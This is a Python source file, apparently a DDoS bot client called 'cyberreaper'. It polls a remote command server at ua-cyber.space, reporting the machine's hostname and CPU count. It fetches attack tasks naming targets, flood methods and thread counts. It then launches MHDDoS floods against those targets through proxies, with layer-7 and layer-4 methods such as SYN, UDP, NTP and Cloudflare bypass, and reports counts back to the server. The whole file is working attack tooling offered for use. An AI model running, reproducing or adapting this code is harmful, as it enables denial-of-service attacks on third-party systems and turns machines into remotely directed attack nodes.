#!/usr/bin/env python3
import argparse
import json
import os

import psutil
import subprocess
import sys

from collections import namedtuple
from concurrent.futures import ThreadPoolExecutor, wait
from logging import basicConfig, getLogger, INFO, DEBUG
from socket import gethostname
from time import sleep
from urllib.request import urlopen, Request

basicConfig(format='[%(asctime)s - %(levelname)-5s] [%(name)s]: %(message)s',
            datefmt="%H:%M:%S")

getLogger('proxies').setLevel("CRITICAL")
logger = getLogger("Bot Runner")
logger.setLevel(DEBUG if os.environ.get("DEBUG") else INFO)

host = "https://ua-cyber.space"

url = f"{host}/api/v2/tasks/json/?hostname={gethostname()}&cpu_count={psutil.cpu_count()}"
counters = f"{host}/api/v2/tasks/stats/"

loop_time = 60
RETRY_PERIOD_SEC = 30

l7 = ["GET", "POST", "OVH", "STRESS", "DYN", "DOWNLOADER", "SLOW", "HEAD", "NULL", "COOKIE",
      "PPS", "EVEN", "GSB", "DGB", "AVB", "BOT", "APACHE", "XMLRPC", "CFB", "CFBUAM", "BYPASS", "BOMB"]
l4 = ["TCP", "UDP", "SYN", "CPS", "CONNECTION", "VSE", "TS3",
      "FIVEM", "MEM", "NTP", "MCBOT", "MINECRAFT", "MCPE"]


def dict_to_nt(obj: dict):
    """
    Re-map dict-like object to the namedtuple instance, having eventual
    attributes and values exactly as 'obj' keys and their values.
    :return: instance of generated namedtuple
    """
    return namedtuple('X', obj.keys())(*obj.values())


def as_mhddos_args(config, threads_limit=0):
    if int(config.Duration) > loop_time:
        period = loop_time
    else:
        period = config.Duration
    cfg_threads = config.Threads if threads_limit <= 0 else threads_limit
    if config.UseProxy:
        if config.Proto in l7:
            params = [
                str(config.Proto),
                str(config.Dst),
                str(config.ProxyType),
                str(cfg_threads),
                str(config.ProxyList),
                str(config.RPC),
                str(period)
            ]
        else:
            params = [
                str(config.Proto),
                str(config.Dst),
                str(cfg_threads),
                str(period),
                str(config.ProxyType),
                str(config.ProxyList)
            ]
    else:
        if not config.Proto in l7:
            params = [
                str(config.Proto),
                str(config.Dst),
                str(cfg_threads),
                str(period)
            ]
        else:
            logger.info(
                'No we cant run the LEVEL7 attacks without proxy. Skipping')
            return
    return params


def run_mhddos(start_args: list):
    try:
        logger.debug(f"Starting now: MHDDoS/start.py {' '.join(mhddos_args)}")
        subprocess.run([sys.executable, "MHDDoS/start.py", *start_args])
        req = Request(counters)
        req.add_header('Content-Type', 'application/json')
        response = urlopen(req, str(json.dumps(start_args)).encode('utf-8'))
        st = json.dumps(response.read().decode())
    except Exception as ex:
        logger.info(f"OOPS... {start_args[:2]} -> Issue: {ex}")


if __name__ == '__main__':

    logger.info('''
  ____      _               ____                         _   _   _   _    
 / ___|   _| |__   ___ _ __/ ___| _ __   __ _  ___ ___  | | | | | | / \   
| |  | | | | '_ \ / _ \ '__\___ \| '_ \ / _` |/ __/ _ \ | | | | | |/ _ \  
| |__| |_| | |_) |  __/ |   ___) | |_) | (_| | (_|  __/ | | | |_| / ___ \ 
 \____\__, |_.__/ \___|_|  |____/| .__/ \__,_|\___\___| | |  \___/_/   \_\ 
      |___/                      |_|                    |_|               
''')
    parser = argparse.ArgumentParser(prog="cyberreaper")
    parser.add_argument("-a", "--max-attacks",
                        action="store",
                        required=False,
                        type=int,
                        default=psutil.cpu_count() // 2 + 1,
                        help="Maximum amount of the attacks executed in parallel (attack pool size).")
    parser.add_argument("-t", "--attack-threads-limit",
                        action="store",
                        required=False,
                        type=int,
                        default=0,
                        help="Limit amount of the threads for every attack. If value >0, it overrules the "
                             "attack's task configuration 'Threads' parameter provided that has higher "
                             "value compared to this option's value.")
    parser.add_argument("-c", "--cpu-limit",
                        action="store",
                        required=False,
                        type=int,
                        default=70,
                        help="Limit the CPU usage by attacks to the specified value.")
    parser.add_argument("--use-proxy",
                        action=argparse.BooleanOptionalAction,
                        required=False,
                        type=bool,
                        default=True,
                        help="Use proxies")

    args = parser.parse_args()
    pool_size = args.max_attacks
    max_threads = args.attack_threads_limit
    cpu_limit = args.cpu_limit
    use_proxy = args.use_proxy

    logger.info(f"Fetch tasks URL: {url}")

    pool = ThreadPoolExecutor(max_workers=pool_size)
    try:
        if use_proxy:
            logger.info("Get fresh proxies. Please wait...")
            from proxies import update_file  # import it here locally, otherwise logging config is screwed
            update_file()
        else:
            with open('MHDDoS/files/proxies/proxylist.txt', 'w') as emty:
                emty.writelines('')

        while True:
            logger.info("Getting fresh tasks from the server!")
            try:
                ftrs = []
                for conf in json.loads(urlopen(url).read(), object_hook=dict_to_nt):
                    mhddos_args = as_mhddos_args(conf, threads_limit=max_threads)
                    if mhddos_args:
                        cpu_usage = psutil.cpu_percent(4)
                        while cpu_usage > cpu_limit:
                            logger.info(f"The CPU load {cpu_usage} is too high. Thread waiting...")
                            sleep(loop_time)
                            cpu_usage = psutil.cpu_percent(4)
                        while True:
                            pending_count = pool._work_queue.qsize()
                            logger.debug(f"Currently pending attacks: {pending_count}")
                            if pending_count > pool_size:
                                logger.info(f"Number of pending attacks [{pending_count}] "
                                            f"is already enough. Waiting...")
                                sleep(loop_time / 4)
                            else:
                                break
                        logger.info("The system works good! Thanks :P ")
                        logger.info(f"Scheduling next attack for: {conf.Dst}")
                        ftrs.append(pool.submit(run_mhddos, mhddos_args))
                        sleep(loop_time / 10)
                wait(ftrs)
            except Exception as error:
                logger.critical(f"OOPS... We faced an issue: {error}")
                logger.info(f"Retrying in {RETRY_PERIOD_SEC}")
                sleep(RETRY_PERIOD_SEC)
    except KeyboardInterrupt:
        logger.info("Shutting down... Ctrl + C")
    except Exception as error:
        logger.critical(f"OOPS... We faced an issue: {error}")
        logger.info("Please restart the tool! Thanks")
    finally:
        pool.shutdown(wait=False, cancel_futures=True)
